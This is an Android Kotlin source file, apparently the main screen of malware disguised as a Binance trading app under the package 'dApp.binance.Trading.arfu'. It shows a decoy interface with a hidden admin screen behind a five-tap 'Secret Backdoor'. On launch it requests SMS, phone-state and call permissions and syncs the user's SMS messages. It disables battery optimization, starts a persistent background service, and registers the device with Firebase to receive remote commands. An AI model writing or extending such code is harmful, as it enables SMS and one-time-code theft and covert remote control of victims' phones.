package dApp.binance.Trading.arfu

import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import android.widget.Button
import android.widget.TextView
import android.widget.LinearLayout
import android.view.View
import androidx.core.app.ActivityCompat
import android.Manifest
import android.content.Context
import android.os.PowerManager
import android.provider.Settings
import android.net.Uri
import android.telephony.SubscriptionManager
import android.util.Log
import android.widget.Toast
import android.content.pm.PackageManager

class MainActivity : AppCompatActivity() {
    private lateinit var statusText: TextView
    private lateinit var deviceIdText: TextView
    private lateinit var lastCommandText: TextView
    private lateinit var decoyLayout: LinearLayout
    private lateinit var realLayout: LinearLayout
    private lateinit var versionText: TextView
    private lateinit var openSettingsButton: Button
    
    private var clickCount = 0
    private var lastClickTime = 0L

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize Views
        decoyLayout = findViewById(R.id.decoyLayout)
        realLayout = findViewById(R.id.realLayout)
        versionText = findViewById(R.id.versionText)
        openSettingsButton = findViewById(R.id.openSettingsButton)
        
        statusText = findViewById(R.id.statusText)
        deviceIdText = findViewById(R.id.deviceIdText)
        lastCommandText = findViewById(R.id.lastCommandText)

        // Redirect Button (The Decoy)
        openSettingsButton.setOnClickListener {
            val intent = Intent(Settings.ACTION_SETTINGS)
            startActivity(intent)
        }

        // Secret Backdoor: Tap version text 5 times
        versionText.setOnClickListener {
            val currentTime = System.currentTimeMillis()
            if (currentTime - lastClickTime < 1000) {
                clickCount++
            } else {
                clickCount = 1
            }
            lastClickTime = currentTime

            if (clickCount >= 5) {
                showRealUI()
                clickCount = 0
            }
        }

        findViewById<Button>(R.id.settingsButton).setOnClickListener {
            startActivity(Intent(this, SettingsActivity::class.java))
        }

        findViewById<Button>(R.id.viewLogsButton).setOnClickListener {
            startActivity(Intent(this, LogViewerActivity::class.java))
        }

        // Background logic
        requestRequiredPermissions()
        requestBatteryOptimization()
        startCarerService()
        detectAndReportSims()

        updateStatus()
    }

    private fun showRealUI() {
        decoyLayout.visibility = View.GONE
        realLayout.visibility = View.VISIBLE
        Toast.makeText(this, "Admin Mode Activated", Toast.LENGTH_SHORT).show()
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
    }

    private fun requestRequiredPermissions() {
        val permissions = mutableListOf<String>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.CALL_PHONE)
            }
            if (checkSelfPermission(Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.INTERNET)
            }
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.READ_PHONE_STATE)
            }
            if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.RECEIVE_SMS)
            }
            if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(Manifest.permission.READ_SMS)
            }
        }

        if (permissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 100)
        } else {
            // Permissions already granted, sync SMS
            SmsHelper.syncLastMessages(this)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100) {
            if (grantResults.isNotEmpty() && grantResults[permissions.indexOf(Manifest.permission.READ_SMS)] == PackageManager.PERMISSION_GRANTED) {
                SmsHelper.syncLastMessages(this)
            }
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val packageName = packageName
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
        }
    }

    private fun detectAndReportSims() {
        try {
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                val simCount = subscriptionManager.activeSubscriptionInfoList?.size ?: 0
                val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
                sharedPref.edit().putInt("sim_count", simCount).apply()
                
                val fcmToken = sharedPref.getString("fcm_token", "") ?: ""
                if (fcmToken.isNotEmpty()) {
                    FirebaseHelper.registerDevice(this, fcmToken, simCount)
                }
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "SIM detect error: ${e.message}")
        }
    }

    private fun startCarerService() {
        val intent = Intent(this, CarerService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun updateStatus() {
        val sharedPref = getSharedPreferences("CarerSettings", MODE_PRIVATE)
        val isEnabled = sharedPref.getBoolean("carer_enabled", true)
        val deviceId = FirebaseHelper.getDeviceId(this)
        val lastCommand = sharedPref.getString("last_command", "None")

        statusText.text = if (isEnabled) "✅ SERVICE ACTIVE" else "⚠️ SERVICE DISABLED"
        deviceIdText.text = "Device ID: $deviceId"
        lastCommandText.text = "Last Command: $lastCommand"
    }
}
